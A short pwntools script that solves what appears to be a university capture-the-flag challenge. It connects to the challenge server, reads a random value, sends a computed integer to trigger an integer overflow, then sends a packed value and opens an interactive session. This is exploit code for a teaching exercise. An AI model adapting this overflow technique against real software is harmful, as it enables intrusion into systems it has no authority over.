from pwn import *

binary = 'chal.bin'
e = context.binary = ELF(binary, checksec=False)

#p = process(binary)
p = remote("cse4850-int-1.chals.io", 443, ssl=True, sni="cse4850-int-1.chals.io")

# name a variable to overflow a 32 bit space
overflow = 2**32

# skip to the random value
p.recvuntil(b'Return ')

# save random value
rand = p.recvline().decode('utf-8').split(' ')[0]

# skip to end of output
p.recvuntil(b'>>> ')

# create payload
payload = (overflow * 2) - int(rand)
#print(payload)

# send payload
p.sendline(str(payload))

# get to input
p.recvuntil(b'>>> ')

# send overflow
p.sendline(p64(overflow))

p.interactive()

